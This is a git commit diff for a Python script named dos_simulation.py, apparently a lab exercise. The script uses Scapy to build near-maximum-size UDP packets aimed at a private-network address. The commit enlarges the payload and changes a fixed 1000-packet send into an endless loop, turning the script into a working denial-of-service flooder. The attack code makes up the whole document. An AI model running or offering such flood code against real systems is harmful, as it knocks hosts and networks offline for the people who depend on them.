6875176d3c9a690e0ba9a213aa3615ef3fe872ee
Ponleou Keo Sok <ponleousk@gmail.com>
2024-05-16 19:14:01 +0700

    fix: increase dos package size

--- dos_simulation.py
+++ dos_simulation.py
@@ -3,9 +3,9 @@ from datetime import date
 
 ip_layer = scp.IP(dst="192.168.8.101")
 udp_layer = scp.UDP()
-raw_layer = scp.Raw(65000)
+raw_layer = scp.Raw(65500)
 
 package = ip_layer / udp_layer / raw_layer
 
-scp.send(package, count=1000)
+scp.send(package, loop=1)
 print(package)
